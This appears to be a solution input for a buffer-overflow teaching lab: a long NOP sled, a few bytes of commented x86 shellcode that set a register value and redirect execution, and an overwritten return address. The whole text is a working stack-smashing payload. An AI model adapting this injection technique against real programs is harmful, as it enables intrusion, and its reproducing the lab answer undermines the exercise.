90 90 90 90    90 90 90 90
90 90 90 90    90 90 90 90
90 90 90 90    90 90 90 90
90 90 90 90    90 90 90 90
90 90 90 90    90 90 90 90
90 90 90 90    90 90 90 90
90 90 90 90    90 90 90 90
90 90 90 90    90 90 90 90
90 90 90 90    90 90 90 90
90 90 90 90    90 90 90 90
90 90 90 90    90 90 90 90
90 90 90 90    90 90 90 90
90 90 90 90    90 90 90 90
90 90 90 90    90 90 90 90
90 90 90 90    90 90 90 90
90 90 90 90    90 90 90 90
90 90 90 90    90 90 90 90
90 90 90 90    90 90 90 90
90 90 90 90    90 90 90 90
90 90 90 90    90 90 90 90
90 90 90 90    90 90 90 90
90 90 90 90    90 90 90 90
90 90 90 90    90 90 90 90
90 90 90 90    90 90 90 90
90 90 90 90    90 90 90 90
90 90 90 90    90 90 90 90
90 90 90 90    90 90 90 90
90 90 90 90    90 90 90 90
90 90 90 90    90 90 90 90
90 90 90 90    90 90 90 90
90 90 90 90    90 90 90 90
90 90 90 90    90 90 90 90
90 90 90 90    90 90 90 90
90 90 90 90    90 90 90 90
90 90 90 90    90 90 90 90
90 90 90 90    90 90 90 90
90 90 90 90    90 90 90 90
90 90 90 90    90 90 90 90
90 90 90 90    90 90 90 90
90 90 90 90    90 90 90 90
90 90 90 90    90 90 90 90
90 90 90 90    90 90 90 90
90 90 90 90    90 90 90 90
90 90 90 90    90 90 90 90
90 90 90 90    90 90 90 90
90 90 90 90    90 90 90 90
90 90 90 90    90 90 90 90
90 90 90 90    90 90 90 90
90 90 90 90    90 90 90 90
90 90 90 90    90 90 90 90
90 90 90 90    90 90 90 90
90 90 90 90    90 90 90 90
90 90 90 90    90 90 90 90
90 90 90 90    90 90 90 90
90 90 90 90    90 90 90 90
90 90 90 90    90 90 90 90
90 90 90 90    90 90 90 90
90 90 90 90    90 90 90 90
90 90 90 90    90 90 90 90
90 90 90 90    90 90 90 90
90 90 90 90    90 90 90 90
90 90 90 90    90 90 90 90
90 90 90 90    90 90 90 90
90 90 90 90

b8 31 39 1e 3c       /*	mov    $0x3c1e3931,%eax */
89 e5                /*	mov    %esp,%ebp        */
83 c5 28             /*	add    $0x28,%ebp       */
68 4a 8e 04 08       /*	push   $0x8048e4a       */
c3                   /*	ret                     */

60 35 68 55
